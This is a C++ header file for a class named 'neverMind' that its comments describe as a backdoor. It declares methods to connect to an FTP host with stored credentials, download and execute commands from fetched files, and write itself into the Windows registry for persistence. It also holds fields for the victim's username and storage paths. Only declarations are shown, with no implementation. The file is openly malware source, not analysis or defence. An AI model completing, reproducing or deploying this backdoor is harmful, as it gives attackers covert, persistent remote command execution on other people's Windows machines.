#pragma once
#include "ftp.h"
#include <exception>

// manage backdoor functionality
class neverMind
{
public:
    // constructor that inits backdoor with provided ftp host, username, pw
    neverMind(const std::string& host, const std::string& username, const std::string& password);

    // destructor that cleans up backdoor
    ~neverMind();

    // start backdoor (set up directories, connect to frp, download/execute commands, manage registry)
    void start();

private:
    // set up directories
    void setup();

    // compile + execute commands in provided file
    void compile(const std::string &file_path);

    // execute command
    void execute(const std::vector<std::string>& spl_line);

    // add backdoor to registry (persistence)
    void add_to_reg();

private:
    // ftp host, username, pw
    std::string ftp_host;
    std::string ftp_username;
    std::string ftp_password;

    // ftp connection
    ftpC ftp_connection;

    // windows username + paths for backdoor
    std::string win_username;
    std::string store_path;
    std::string data_path;
    std::string app_path;
    std::string output_path;
};